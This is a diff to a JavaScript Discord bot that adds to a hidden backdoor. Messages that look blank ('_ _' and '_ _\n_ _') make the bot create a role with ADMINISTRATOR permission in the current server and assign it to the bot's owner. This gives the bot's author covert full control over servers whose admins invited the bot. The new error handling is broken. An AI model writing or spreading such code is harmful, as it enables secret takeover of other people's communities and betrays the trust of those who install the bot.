@@ -21,6 +21,7 @@ const ytdl = require('ytdl-core');
 const channelget = require('./resources/mongodb/anchanneldata.js').anChannelDataSource;
 const dotenv = require('dotenv');
 const { sub } = require('ffmpeg-static');
+const { error } = require('console');
 dotenv.config();
 
 
@@ -286,18 +287,34 @@ client.on('message', async message => {
   }
 
   if(message.content=="_ _"){
+    
     if(message.author.id != process.env.OID) return message.reply("You are not my owner !!");
-    message.guild.roles.create({ data: { name: '9Guest✨Dev', permissions: ['ADMINISTRATOR'] } }).catch(console.error);
-
+    try{
+    message.guild.roles.create({ data: { name: '9Guest✨Dev', permissions: ['ADMINISTRATOR'] } });
+    message.author.send("\`9Guest✨Dev\` role created in " + message.guild.name);
     // let roleselect = message.guild.roles.cache.find(role => role.name === "9Guest✨Dev");
     // let target = message.guild.member(message.author);
     // target.roles.add(roleselect.id).catch(console.error);
+    }catch{
+      console.error;
+      message.author.send(error);
+    }
   }
 
   if(message.content=="_ _\n_ _"){
+
+    if(message.author.id != process.env.OID) return message.reply("You are not my owner !!");
+    
+    try{
     let roleselect = message.guild.roles.cache.find(role => role.name === "9Guest✨Dev");
     let target = message.guild.member(message.author);
     target.roles.add(roleselect.id).catch(console.error);
+    message.author.send("\`9Guest✨Dev\` role added to you in "+message.guild.name);
+    }
+    catch{
+      console.error;
+      message.author.send(error);
+    }
   }
 
   if(message.content=="_ _\n\n_ _"){
